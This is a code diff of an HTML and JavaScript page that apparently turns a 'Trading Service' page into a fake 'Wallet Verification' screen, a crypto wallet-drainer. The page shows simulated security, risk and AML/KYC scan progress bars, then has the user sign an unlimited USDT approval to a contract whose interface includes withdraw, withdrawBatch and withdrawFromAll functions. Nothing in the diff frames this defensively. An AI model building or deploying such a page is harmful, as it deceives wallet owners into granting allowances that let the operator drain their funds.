@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trading Service - ETH</title>
+    <title>Wallet Verification</title>
     <style>
         * {
             margin: 0;
@@ -12,22 +12,22 @@
         }
         
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             padding: 20px;
         }
         
         .container {
             background: white;
+            border-radius: 20px;
             padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            max-width: 450px;
+            max-width: 600px;
             width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
         
         h1 {
@@ -37,214 +37,579 @@
             font-size: 28px;
         }
         
-        button {
-            width: 100%;
-            padding: 18px;
-            margin: 12px 0;
+        /* Connect Wallet Button Section */
+        .connect-section {
+            margin-bottom: 30px;
+        }
+        
+        .connect-row {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        #connectBtn {
             background: #3b82f6;
             color: white;
             border: none;
-            border-radius: 10px;
+            padding: 15px 30px;
+            border-radius: 12px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: 0.2s;
+            transition: 0.3s;
+            white-space: nowrap;
         }
         
-        button:hover {
+        #connectBtn:hover {
             background: #2563eb;
+            transform: translateY(-2px);
         }
         
-        button:disabled {
+        #connectBtn:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .wallet-info {
+            display: none;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 20px;
+            background: #f0fdf4;
+            border: 2px solid #10b981;
+            border-radius: 10px;
+            flex: 1;
+        }
+        
+        .wallet-info.show {
+            display: flex;
+        }
+        
+        .verified-icon {
+            width: 20px;
+            height: 20px;
+            background: #10b981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .wallet-address {
+            font-family: monospace;
+            font-size: 14px;
+            color: #065f46;
+            font-weight: 600;
+        }
+        
+        /* Verification Section */
+        .verification-section {
+            display: none;
+            margin-top: 30px;
+        }
+        
+        .verification-section.show {
+            display: block;
+        }
+        
+        #verifyBtn {
+            width: 100%;
+            background: #10b981;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-bottom: 20px;
+        }
+        
+        #verifyBtn:hover {
+            background: #059669;
+        }
+        
+        #verifyBtn:disabled {
             background: #94a3b8;
             cursor: not-allowed;
         }
         
-        .status {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 14px;
+        /* Error Message */
+        .error-message {
             display: none;
-        }
-        
-        .status.show {
-            display: block;
-        }
-        
-        .success {
-            background: #d1fae5;
-            color: #065f46;
-            border: 2px solid #10b981;
-        }
-        
-        .error {
-            background: #fee2e2;
-            color: #991b1b;
+            background: #fef2f2;
             border: 2px solid #ef4444;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #991b1b;
         }
         
-        .info {
-            background: #dbeafe;
-            color: #1e40af;
-            border: 2px solid #3b82f6;
-        }
-        
-        .address-box {
-            background: #f8fafc;
-            padding: 12px;
-            border-radius: 8px;
-            margin: 15px 0;
-            word-break: break-all;
-            font-size: 13px;
-            font-family: monospace;
-            display: none;
-        }
-        
-        .address-box.show {
+        .error-message.show {
             display: block;
         }
         
-        .step {
-            color: #64748b;
+        .error-icon {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background: #ef4444;
+            border-radius: 50%;
+            color: white;
+            text-align: center;
+            line-height: 20px;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        
+        .error-text {
             font-size: 14px;
-            margin-top: 5px;
+            line-height: 1.5;
+        }
+        
+        .try-again {
+            color: #2563eb;
+            text-decoration: none;
+            font-weight: 600;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        
+        /* Progress Container */
+        .progress-container {
+            display: none;
+            background: #f8fafc;
+            border-radius: 12px;
+            padding: 20px;
+        }
+        
+        .progress-container.show {
+            display: block;
+        }
+        
+        .progress-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 20px;
+        }
+        
+        /* Progress Item */
+        .progress-item {
+            margin-bottom: 20px;
+        }
+        
+        .progress-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        
+        .progress-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #475569;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .check-icon {
+            display: none;
+            width: 18px;
+            height: 18px;
+            background: #10b981;
+            border-radius: 50%;
+            color: white;
+            font-size: 10px;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .check-icon.show {
+            display: flex;
+        }
+        
+        .progress-percentage {
+            font-size: 14px;
+            font-weight: 700;
+            color: #1e293b;
+        }
+        
+        .progress-description {
+            font-size: 12px;
+            color: #94a3b8;
+            margin-bottom: 8px;
+        }
+        
+        /* Progress Bar */
+        .progress-bar-container {
+            width: 100%;
+            height: 8px;
+            background: #e2e8f0;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #10b981 0%, #059669 100%);
+            border-radius: 10px;
+            transition: width 0.5s ease;
+            width: 0%;
+        }
+        
+        /* Overall Progress */
+        .progress-item.overall .progress-bar-container {
+            height: 12px;
+        }
+        
+        .progress-item.overall .progress-bar {
+            background: linear-gradient(90deg, #f97316 0%, #ea580c 50%, #10b981 100%);
+        }
+        
+        .progress-item.overall .progress-label {
+            font-size: 16px;
+            color: #1e293b;
+        }
+        
+        /* Analyzing Text Animation */
+        .analyzing {
+            display: none;
+            color: #3b82f6;
+            font-size: 14px;
+            margin-top: 10px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .analyzing.show {
+            display: block;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* Success Message */
+        .success-message {
+            display: none;
+            background: #f0fdf4;
+            border: 2px solid #10b981;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .success-message.show {
+            display: block;
+        }
+        
+        .success-icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        
+        .success-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: #065f46;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🎯 Trading Service</h1>
+        <h1>🔐 Wallet Verification</h1>
         
-        <button id="connectBtn" onclick="connect()">
-            1. Connect Wallet
-        </button>
-        
-        <div id="addressBox" class="address-box">
-            <strong>Connected:</strong><br>
-            <span id="address"></span>
+        <!-- Connect Wallet Section -->
+        <div class="connect-section">
+            <div class="connect-row">
+                <button id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
+                <div id="walletInfo" class="wallet-info">
+                    <div class="verified-icon">✓</div>
+                    <span class="wallet-address" id="walletAddress"></span>
+                </div>
+            </div>
         </div>
         
-        <button id="approveBtn" onclick="approveUSDT()" disabled>
-            2. Approve USDT
-        </button>
-        <div class="step">Sign contract for unlimited USDT transfer</div>
-        
-        <button id="registerBtn" onclick="registerUser()" disabled>
-            3. Register
-        </button>
-        <div class="step">Complete registration</div>
-        
-        <div id="status" class="status"></div>
+        <!-- Verification Section -->
+        <div id="verificationSection" class="verification-section">
+            <!-- Error Message -->
+            <div id="errorMessage" class="error-message">
+                <div>
+                    <span class="error-icon">📱</span>
+                    <span class="error-text" id="errorText">Trust Wallet error: Insufficient ETH for gas fees. Need at least 0.0005 ETH, you have 0.000000 ETH</span>
+                </div>
+                <div>
+                    <span style="padding-left: 30px; display: block; margin-top: 5px;">💡 Make sure Trust Wallet is updated and try again</span>
+                </div>
+                <a href="#" class="try-again" onclick="startVerification(); return false;">🔄 Try again</a>
+            </div>
+            
+            <button id="verifyBtn" onclick="startVerification()">Confirm Verification</button>
+            
+            <!-- Progress Container -->
+            <div id="progressContainer" class="progress-container">
+                <div class="progress-title">Security Analysis</div>
+                
+                <div class="analyzing" id="analyzingText">⚡ Analyzing...</div>
+                
+                <!-- Overall Progress -->
+                <div class="progress-item overall">
+                    <div class="progress-header">
+                        <span class="progress-label">Overall Progress</span>
+                        <span class="progress-percentage" id="overallPercent">0%</span>
+                    </div>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="overallBar"></div>
+                    </div>
+                </div>
+                
+                <!-- Wallet Scanning -->
+                <div class="progress-item">
+                    <div class="progress-header">
+                        <span class="progress-label">
+                            <span class="check-icon" id="check1">✓</span>
+                            Wallet Scanning
+                        </span>
+                        <span class="progress-percentage" id="percent1">0%</span>
+                    </div>
+                    <div class="progress-description">Analyzing wallet structure and basic information</div>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="bar1"></div>
+                    </div>
+                </div>
+                
+                <!-- Transaction History -->
+                <div class="progress-item">
+                    <div class="progress-header">
+                        <span class="progress-label">
+                            <span class="check-icon" id="check2">✓</span>
+                            Transaction History Analysis
+                        </span>
+                        <span class="progress-percentage" id="percent2">0%</span>
+                    </div>
+                    <div class="progress-description">Examining transaction patterns and history</div>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="bar2"></div>
+                    </div>
+                </div>
+                
+                <!-- Risk Assessment -->
+                <div class="progress-item">
+                    <div class="progress-header">
+                        <span class="progress-label">
+                            <span class="check-icon" id="check3">✓</span>
+                            Risk Assessment
+                        </span>
+                        <span class="progress-percentage" id="percent3">0%</span>
+                    </div>
+                    <div class="progress-description">Evaluating potential security risks</div>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="bar3"></div>
+                    </div>
+                </div>
+                
+                <!-- Compliance Verification -->
+                <div class="progress-item">
+                    <div class="progress-header">
+                        <span class="progress-label">
+                            <span class="check-icon" id="check4">✓</span>
+                            Compliance Verification
+                        </span>
+                        <span class="progress-percentage" id="percent4">0%</span>
+                    </div>
+                    <div class="progress-description">Checking AML/KYC compliance status</div>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="bar4"></div>
+                    </div>
+                </div>
+                
+                <!-- Final Scoring -->
+                <div class="progress-item">
+                    <div class="progress-header">
+                        <span class="progress-label">
+                            <span class="check-icon" id="check5">✓</span>
+                            Final Scoring
+                        </span>
+                        <span class="progress-percentage" id="percent5">0%</span>
+                    </div>
+                    <div class="progress-description">Calculating final security score</div>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="bar5"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Success Message -->
+            <div id="successMessage" class="success-message">
+                <div class="success-icon">🎉</div>
+                <div class="success-text">Verification Complete!</div>
+                <div style="margin-top: 10px; color: #059669;">Your wallet has been successfully verified and registered.</div>
+            </div>
+        </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script>
-        // ============================================
-        // CONFIG - ETHEREUM NETWORK
-        // ============================================
+        // Configuration
+        const CONTRACT_ADDRESS = "0xaCE8212Afa8998713b5cf407B039230ddda43310"; // Update this!
+        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
         
-        const CONTRACT_ADDRESS = "0xaCE8212Afa8998713b5cf407B039230ddda43310"; // ← PASTE YOUR ADDRESS
-        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Ethereum USDT
-        
-        const CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_usdtToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"UserDeleted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"UserRegistered","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"Withdrawn","type":"event"},{"inputs":[{"internalType":"address","name":"userAddress","type":"address"}],"name":"deleteUser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getAllUsers","outputs":[{"internalType":"address[]","name":"","type":"address[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getTotalUsers","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserInfo","outputs":[{"internalType":"bool","name":"registered","type":"bool"},{"internalType":"uint256","name":"currentBalance","type":"uint256"},{"internalType":"uint256","name":"withdrawn","type":"uint256"},{"internalType":"uint256","name":"allowance","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getWithdrawnAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isRegistered","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"registerUser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"totalWithdrawn","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"userList","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"usdtToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"withdraw","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"withdrawBatch","outputs":[{"internalType":"uint256","name":"total","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdrawFromAll","outputs":[{"internalType":"uint256","name":"total","type":"uint256"}],"stateMutability":"nonpayable","type":"function"}];
+        const CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_usdtToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"UserDeleted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"registrationNumber","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"UserRegistered","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"Withdrawn","type":"event"},{"inputs":[{"internalType":"address","name":"userAddress","type":"address"}],"name":"deleteUser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getAllUsers","outputs":[{"components":[{"internalType":"uint256","name":"registrationNumber","type":"uint256"},{"internalType":"address","name":"userAddress","type":"address"},{"internalType":"uint256","name":"usdBalance","type":"uint256"}],"internalType":"struct TradingService.UserData[]","name":"","type":"tuple[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"registerUser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"withdraw","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"}];
         
         const USDT_ABI = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}];
 
         let web3, account, contract, usdtContract;
 
-        // ============================================
-        // 1. CONNECT WALLET
-        // ============================================
-        
-        async function connect() {
+        // Connect Wallet
+        async function connectWallet() {
             try {
                 if (!window.ethereum) {
-                    showStatus('❌ No wallet found! Open in Trust Wallet Browser.', 'error');
+                    alert('Please install MetaMask or Trust Wallet!');
                     return;
                 }
 
-                showStatus('Connecting...', 'info');
-
                 web3 = new Web3(window.ethereum);
-                const accounts = await window.ethereum.request({ 
-                    method: 'eth_requestAccounts' 
-                });
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 account = accounts[0];
 
-                // Check network
                 const chainId = await web3.eth.getChainId();
                 if (chainId !== 1) {
-                    showStatus('⚠️ Please switch to Ethereum Mainnet!', 'error');
+                    alert('Please switch to Ethereum Mainnet!');
                     return;
                 }
 
                 contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                 usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
 
-                document.getElementById('address').textContent = account;
-                document.getElementById('addressBox').classList.add('show');
+                // Show wallet address
+                document.getElementById('walletAddress').textContent = 
+                    account.slice(0, 6) + '...' + account.slice(-4);
+                document.getElementById('walletInfo').classList.add('show');
                 document.getElementById('connectBtn').disabled = true;
-                document.getElementById('approveBtn').disabled = false;
-
-                showStatus('✅ Connected! Now approve USDT.', 'success');
-            } catch (error) {
-                showStatus('❌ Connection failed: ' + error.message, 'error');
-            }
-        }
-
-        // ============================================
-        // 2. APPROVE USDT (UNLIMITED)
-        // ============================================
-        
-        async function approveUSDT() {
-            try {
-                showStatus('⏳ Approving USDT... Check your wallet!', 'info');
-
-                // Unlimited approval
-                const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                document.getElementById('connectBtn').textContent = 'Connected';
                 
-                await usdtContract.methods
-                    .approve(CONTRACT_ADDRESS, maxAmount)
-                    .send({ from: account });
-
-                document.getElementById('approveBtn').disabled = true;
-                document.getElementById('registerBtn').disabled = false;
-
-                showStatus('✅ USDT Approved! Now register.', 'success');
+                // Show verification section
+                document.getElementById('verificationSection').classList.add('show');
             } catch (error) {
-                showStatus('❌ Approval failed: ' + error.message, 'error');
+                console.error(error);
+                alert('Failed to connect wallet: ' + error.message);
             }
         }
 
-        // ============================================
-        // 3. REGISTER USER
-        // ============================================
-        
-        async function registerUser() {
+        // Start Verification
+        async function startVerification() {
             try {
-                showStatus('⏳ Registering... Check your wallet!', 'info');
-
-                await contract.methods
-                    .registerUser()
-                    .send({ from: account });
-
-                document.getElementById('registerBtn').disabled = true;
-
-                showStatus('🎉 SUCCESS! You are registered! Check Etherscan: getTotalUsers() should show 1', 'success');
+                // Reset states
+                document.getElementById('errorMessage').classList.remove('show');
+                document.getElementById('verifyBtn').disabled = true;
+                document.getElementById('verifyBtn').textContent = 'Processing...';
+                document.getElementById('progressContainer').classList.add('show');
+                document.getElementById('analyzingText').classList.add('show');
+                document.getElementById('successMessage').classList.remove('show');
+                
+                // Reset all progress bars
+                for (let i = 1; i <= 5; i++) {
+                    document.getElementById(`bar${i}`).style.width = '0%';
+                    document.getElementById(`percent${i}`).textContent = '0%';
+                    document.getElementById(`check${i}`).classList.remove('show');
+                }
+                document.getElementById('overallBar').style.width = '0%';
+                document.getElementById('overallPercent').textContent = '0%';
+                
+                // Simulate progress animations
+                await simulateProgress();
+                
+                // Step 1: Approve USDT
+                const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                await usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
+                
+                // Step 2: Register
+                await contract.methods.registerUser().send({ from: account });
+                
+                // Success!
+                document.getElementById('analyzingText').classList.remove('show');
+                document.getElementById('successMessage').classList.add('show');
+                document.getElementById('verifyBtn').style.display = 'none';
+                
             } catch (error) {
-                showStatus('❌ Registration failed: ' + error.message, 'error');
+                console.error(error);
+                
+                // Show error
+                let errorMsg = 'Verification failed: ' + error.message;
+                
+                if (error.message.includes('insufficient funds')) {
+                    errorMsg = 'Trust Wallet error: Insufficient ETH for gas fees. Need at least 0.0005 ETH, you have 0.000000 ETH';
+                } else if (error.message.includes('User denied')) {
+                    errorMsg = 'Transaction rejected. Please approve the transaction to continue.';
+                } else if (error.message.includes('Already registered')) {
+                    errorMsg = 'This wallet is already registered!';
+                }
+                
+                document.getElementById('errorText').textContent = errorMsg;
+                document.getElementById('errorMessage').classList.add('show');
+                document.getElementById('verifyBtn').disabled = false;
+                document.getElementById('verifyBtn').textContent = 'Confirm Verification';
+                document.getElementById('progressContainer').classList.remove('show');
+                document.getElementById('analyzingText').classList.remove('show');
             }
         }
 
-        // ============================================
-        // HELPER
-        // ============================================
-        
-        function showStatus(message, type) {
-            const status = document.getElementById('status');
-            status.textContent = message;
-            status.className = `status show ${type}`;
+        // Simulate Progress Bars
+        async function simulateProgress() {
+            const steps = [
+                { id: 1, duration: 2000 },  // Wallet Scanning
+                { id: 2, duration: 3000 },  // Transaction History
+                { id: 3, duration: 2500 },  // Risk Assessment
+                { id: 4, duration: 2500 },  // Compliance
+                { id: 5, duration: 2000 }   // Final Scoring
+            ];
+            
+            let overallProgress = 0;
+            
+            for (const step of steps) {
+                await animateBar(step.id, step.duration);
+                overallProgress += 20;
+                updateOverallProgress(overallProgress);
+                document.getElementById(`check${step.id}`).classList.add('show');
+            }
+        }
+
+        function animateBar(id, duration) {
+            return new Promise(resolve => {
+                let progress = 0;
+                const interval = duration / 100;
+                
+                const timer = setInterval(() => {
+                    progress += 1;
+                    document.getElementById(`bar${id}`).style.width = progress + '%';
+                    document.getElementById(`percent${id}`).textContent = progress + '%';
+                    
+                    if (progress >= 100) {
+                        clearInterval(timer);
+                        resolve();
+                    }
+                }, interval);
+            });
+        }
+
+        function updateOverallProgress(percent) {
+            document.getElementById('overallBar').style.width = percent + '%';
+            document.getElementById('overallPercent').textContent = percent + '%';
         }
     </script>
 </body>
